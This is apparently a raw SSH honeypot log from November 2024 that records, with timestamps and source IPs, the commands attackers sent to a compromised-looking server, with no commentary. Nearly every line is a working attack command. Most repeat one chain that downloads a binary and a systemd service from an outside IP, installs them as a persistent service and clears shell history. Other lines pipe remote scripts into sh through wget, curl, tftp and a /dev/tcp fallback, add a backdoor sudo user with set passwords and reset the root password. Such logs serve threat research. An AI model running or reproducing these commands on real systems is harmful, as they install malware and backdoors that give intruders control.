2024-11-17 21:40:56.373041 - ('141.98.11.81', 33326) - apt
2024-11-17 21:40:56.695776 - ('141.98.11.81', 33326) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-17 21:41:02.034820 - ('141.98.11.81', 33340) - apt
2024-11-17 21:41:02.172646 - ('141.98.11.81', 33340) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-17 21:41:09.601358 - ('141.98.11.81', 33424) - apt
2024-11-17 21:41:10.341098 - ('141.98.11.81', 33424) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-17 21:41:12.627270 - ('141.98.11.81', 58188) - apt
2024-11-17 21:41:13.118329 - ('141.98.11.81', 58188) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-17 21:41:17.829337 - ('141.98.11.81', 58192) - apt
2024-11-17 21:41:17.915020 - ('141.98.11.81', 58192) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-17 21:41:21.862614 - ('141.98.11.81', 56110) - apt
2024-11-17 21:41:21.998565 - ('141.98.11.81', 56110) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-17 21:41:23.509171 - ('141.98.11.81', 56126) - apt
2024-11-17 21:41:24.422081 - ('141.98.11.81', 56126) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-17 21:41:26.149801 - ('141.98.11.81', 53388) - apt
2024-11-17 21:41:26.789314 - ('141.98.11.81', 53388) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-17 21:41:30.354790 - ('141.98.11.81', 53444) - apt
2024-11-17 21:41:31.616659 - ('141.98.11.81', 53444) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-17 21:41:34.771947 - ('141.98.11.81', 53496) - apt
2024-11-17 21:41:35.065000 - ('141.98.11.81', 53496) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-17 21:41:37.029088 - ('141.98.11.81', 59468) - apt
2024-11-17 21:41:37.627282 - ('141.98.11.81', 59468) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-17 21:41:39.662488 - ('141.98.11.81', 59476) - apt
2024-11-17 21:41:40.233737 - ('141.98.11.81', 59476) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-17 21:41:41.406577 - ('141.98.11.81', 59486) - apt
2024-11-17 21:41:42.226846 - ('141.98.11.81', 59486) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-17 21:41:43.953865 - ('141.98.11.81', 59494) - apt
2024-11-17 21:41:44.646477 - ('141.98.11.81', 59494) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-17 21:41:46.550245 - ('141.98.11.81', 39874) - apt
2024-11-17 21:41:47.219217 - ('141.98.11.81', 39874) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-17 21:41:51.283222 - ('141.98.11.81', 39944) - apt
2024-11-17 21:41:51.644519 - ('141.98.11.81', 39944) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-17 21:41:52.737382 - ('141.98.11.81', 39952) - apt
2024-11-17 21:41:53.577914 - ('141.98.11.81', 39952) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-17 21:41:54.973514 - ('141.98.11.81', 39988) - apt
2024-11-17 21:41:55.504680 - ('141.98.11.81', 39988) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-17 21:41:56.416781 - ('141.98.11.81', 46220) - apt
2024-11-17 21:41:57.177097 - ('141.98.11.81', 46220) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-17 21:41:58.094519 - ('141.98.11.81', 46242) - apt
2024-11-17 21:41:58.630807 - ('141.98.11.81', 46242) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-17 21:42:02.530355 - ('141.98.11.81', 46290) - apt
2024-11-17 21:42:03.094978 - ('141.98.11.81', 46290) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-17 21:42:04.488124 - ('141.98.11.81', 46324) - apt
2024-11-17 21:42:04.772690 - ('141.98.11.81', 46324) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-17 21:42:07.083739 - ('141.98.11.81', 35794) - apt
2024-11-17 21:42:07.454706 - ('141.98.11.81', 35794) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-17 21:42:08.900004 - ('141.98.11.81', 35806) - apt
2024-11-17 21:42:09.656902 - ('141.98.11.81', 35806) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-17 21:42:11.210724 - ('141.98.11.81', 35818) - apt
2024-11-17 21:42:11.345807 - ('141.98.11.81', 35818) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-17 21:42:13.377798 - ('141.98.11.81', 35830) - apt
2024-11-17 21:42:13.641960 - ('141.98.11.81', 35830) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-17 21:42:16.594237 - ('141.98.11.81', 49454) - apt
2024-11-17 21:42:17.613680 - ('141.98.11.81', 49454) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-17 21:42:21.912631 - ('141.98.11.81', 49468) - apt
2024-11-17 21:42:22.556620 - ('141.98.11.81', 49468) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-17 21:42:24.742601 - ('141.98.11.81', 49482) - apt
2024-11-17 21:42:24.861874 - ('141.98.11.81', 49482) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-17 21:42:26.130968 - ('141.98.11.81', 47446) - apt
2024-11-17 21:42:26.778004 - ('141.98.11.81', 47446) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-17 21:42:28.910047 - ('141.98.11.81', 47460) - apt
2024-11-17 21:42:29.046970 - ('141.98.11.81', 47460) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-17 21:42:31.487489 - ('141.98.11.81', 47476) - apt
2024-11-17 21:42:31.811081 - ('141.98.11.81', 47476) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-17 21:42:35.243832 - ('141.98.11.81', 47530) - apt
2024-11-17 21:42:35.556045 - ('141.98.11.81', 47530) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-17 21:42:37.742331 - ('141.98.11.81', 50918) - apt
2024-11-17 21:42:38.505620 - ('141.98.11.81', 50918) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-17 21:42:40.638518 - ('141.98.11.81', 50948) - apt
2024-11-17 21:42:40.941036 - ('141.98.11.81', 50948) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-18 02:04:33.193512 - ('87.120.113.231', 60860) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-11-18 03:07:45.396705 - ('78.73.143.53', 41338) - wget -qO - http://61.215.136.198/x/1sh | sh > /dev/null 2>&1 &
2024-11-18 03:07:45.478678 - ('78.73.143.53', 41338) - rm -rf /var/run/1sh; wget -c http://61.215.136.198/x/1sh -P /var/run && sh /var/run/1sh &
2024-11-18 03:07:45.560134 - ('78.73.143.53', 41338) - wget -qO - http://61.215.136.198/x/2sh | sh > /dev/null 2>&1 &
2024-11-18 03:07:45.641546 - ('78.73.143.53', 41338) - rm -rf /tmp/2sh; wget -c http://61.215.136.198/x/2sh -P /tmp && sh /tmp/2sh &
2024-11-18 03:07:45.725608 - ('78.73.143.53', 41338) - curl http://61.215.136.198/x/3sh | sh
2024-11-18 03:07:45.807777 - ('78.73.143.53', 41338) - cd /var/run ; rm -rf tsh ; tftp -g 127.0.0.1 -r tsh ; sh tsh &
2024-11-18 03:07:45.889585 - ('78.73.143.53', 41338) - cd /tmp ; rm -rf tsh ; tftp -g 127.0.0.1 -r tsh ; sh tsh &
2024-11-18 03:07:45.971775 - ('78.73.143.53', 41338) - cd /dev/shm ; rm -rf tsh ; tftp -g 127.0.0.1 -r tsh ; sh tsh &
2024-11-18 03:07:46.053011 - ('78.73.143.53', 41338) - uname -a || cat /proc/version || echo -- 
2024-11-18 04:17:38.499960 - ('87.120.113.231', 50448) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-11-18 04:32:22.293265 - ('46.19.143.66', 42604) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 P42AkUmH) system && sudo usermod -aG sudo system
2024-11-18 04:32:22.625039 - ('46.19.143.66', 42604) - lscpu && echo -e "P42AkUmH\nP42AkUmH" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
2024-11-18 04:58:03.451298 - ('79.137.207.254', 33640) - uname -a
2024-11-18 05:04:24.199879 - ('46.19.143.66', 36640) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 PgPzmjsT) system && sudo usermod -aG sudo system
2024-11-18 05:04:24.681356 - ('46.19.143.66', 36640) - lscpu && echo -e "PgPzmjsT\nPgPzmjsT" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
2024-11-18 17:44:19.866836 - ('46.19.143.66', 40066) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 rZYrHbNN) system && sudo usermod -aG sudo system
2024-11-18 17:44:20.308931 - ('46.19.143.66', 40066) - lscpu && echo -e "rZYrHbNN\nrZYrHbNN" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
2024-11-18 18:12:00.611958 - ('45.148.10.46', 50508) - apt
2024-11-18 18:12:00.915019 - ('45.148.10.46', 50508) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-18 18:12:01.351911 - ('45.148.10.46', 50518) - apt
2024-11-18 18:12:01.534769 - ('45.148.10.46', 50518) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-18 18:12:01.910195 - ('45.148.10.46', 50520) - apt
2024-11-18 18:12:02.135399 - ('45.148.10.46', 50520) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-18 18:12:02.652361 - ('45.148.10.46', 50532) - apt
2024-11-18 18:12:02.945353 - ('45.148.10.46', 50532) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-18 18:12:03.715142 - ('45.148.10.46', 50544) - apt
2024-11-18 18:12:04.033473 - ('45.148.10.46', 50544) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-18 18:12:04.710652 - ('45.148.10.46', 50548) - apt
2024-11-18 18:12:05.012700 - ('45.148.10.46', 50548) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-18 18:12:05.625917 - ('45.148.10.46', 50564) - apt
2024-11-18 18:12:05.840506 - ('45.148.10.46', 50564) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-18 18:12:06.215648 - ('45.148.10.46', 50574) - apt
2024-11-18 18:12:06.510383 - ('45.148.10.46', 50574) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-18 18:12:07.020063 - ('45.148.10.46', 50576) - apt
2024-11-18 18:12:07.319327 - ('45.148.10.46', 50576) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-18 18:12:07.834176 - ('45.148.10.46', 50580) - apt
2024-11-18 18:12:08.036427 - ('45.148.10.46', 50580) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-18 18:12:08.519947 - ('45.148.10.46', 50594) - apt
2024-11-18 18:12:08.841759 - ('45.148.10.46', 50594) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-18 18:12:09.439129 - ('45.148.10.46', 42914) - apt
2024-11-18 18:12:09.708873 - ('45.148.10.46', 42914) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-18 18:12:10.272761 - ('45.148.10.46', 42930) - apt
2024-11-18 18:12:10.547618 - ('45.148.10.46', 42930) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-18 18:12:11.127906 - ('45.148.10.46', 42944) - apt
2024-11-18 18:12:11.444566 - ('45.148.10.46', 42944) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-18 18:12:12.123587 - ('45.148.10.46', 42990) - apt
2024-11-18 18:12:12.431954 - ('45.148.10.46', 42990) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-18 18:12:13.148604 - ('45.148.10.46', 43036) - apt
2024-11-18 18:12:13.508915 - ('45.148.10.46', 43036) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-18 18:12:14.120678 - ('45.148.10.46', 43046) - apt
2024-11-18 18:12:14.341058 - ('45.148.10.46', 43046) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-18 21:07:38.688173 - ('203.206.203.50', 57057) - /ip cloud print
2024-11-18 21:07:40.796524 - ('203.206.203.50', 57057) - ifconfig
2024-11-18 21:07:42.532832 - ('203.206.203.50', 57057) - uname -a
2024-11-18 21:07:44.272352 - ('203.206.203.50', 57057) - cat /proc/cpuinfo
2024-11-18 21:07:46.007846 - ('203.206.203.50', 57057) - ps | grep '[Mm]iner'
2024-11-18 21:07:47.744059 - ('203.206.203.50', 57057) - ps -ef | grep '[Mm]iner'
2024-11-18 21:07:49.479960 - ('203.206.203.50', 57057) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-11-18 21:07:51.216483 - ('203.206.203.50', 57057) - echo Hi | cat -n
